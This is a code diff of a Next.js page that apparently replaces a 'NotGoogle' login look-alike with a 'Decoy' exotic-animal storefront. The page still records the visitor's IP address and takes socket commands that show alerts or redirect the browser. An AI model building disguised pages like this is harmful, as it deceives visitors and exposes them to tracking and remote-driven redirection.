@@ -1,10 +1,10 @@
 'use client';
 import { useEffect, useState } from "react";
 import { socket } from "../socket.js";
-import { useRouter } from "next/navigation";
-import Login from '@/clientComponents/login/login';
+import decoyStyles from "./decoy.module.css";
+import { useRouter } from 'next/navigation';
 
-const NotGoogle = () => {
+export default function Decoy () {
   const [ipv4, setIpv4] = useState(null);
   const [isConnected, setIsConnected] = useState(false);
   const [transport, setTransport] = useState("N/A");
@@ -48,6 +48,7 @@ const NotGoogle = () => {
     function handleAlert(message) {
       console.log("Alerting user with message: ", message);
       alert(message);
+
     }
 
     function handlePushToPage(site) {
@@ -76,22 +77,48 @@ const NotGoogle = () => {
           throw new Error("Failed to fetch IPv4 address");
         }
         const result = await response.json();
-        setIpv4(result.ip);
-        //console.log(result.ip);
+        setIpv4(result.ip);;
       } catch (error) {
         console.error("Error fetching IPv4 address:", error.message);
       }
     };
-
     fetchIPv4();
   }, [router]);
 
 
   return (
-    <div>
-      <Login argument={"notGoogle"} />
+    <div className={decoyStyles.container}>
+      <div className={decoyStyles.header}>
+        <h1>Welcome to Exotic Animals Emporium</h1>
+      </div>
+      <div className={decoyStyles.main}>
+        <div className={decoyStyles.animalList}>
+          <h2>Available Exotic Animals</h2>
+          <ul>
+            <li>Lion</li>
+            <li>Tiger</li>
+            <li>Elephant</li>
+            <li>Giraffe</li>
+            <li>Monkey</li>
+            {/* Add more exotic animals here */}
+          </ul>
+        </div>
+        <div className={decoyStyles.buyingGuide}>
+          <h2>How to Buy an Exotic Animal</h2>
+          <p>Follow these simple steps to purchase your dream exotic animal:</p>
+          <ol>
+            <li>Choose the animal you want to buy from our list.</li>
+            <li>Contact us via email or phone to inquire about the availability and price.</li>
+            <li>Arrange for the purchase and delivery of your exotic pet.</li>
+            <li>Enjoy your new exotic companion!</li>
+          </ol>
+        </div>
+      </div>
+      <div className={decoyStyles.footer}>
+        <p>&copy; 2024 Exotic Animals Emporium. All rights reserved.</p>
+      </div>
     </div>
   );
 };
 
-export default NotGoogle;
+
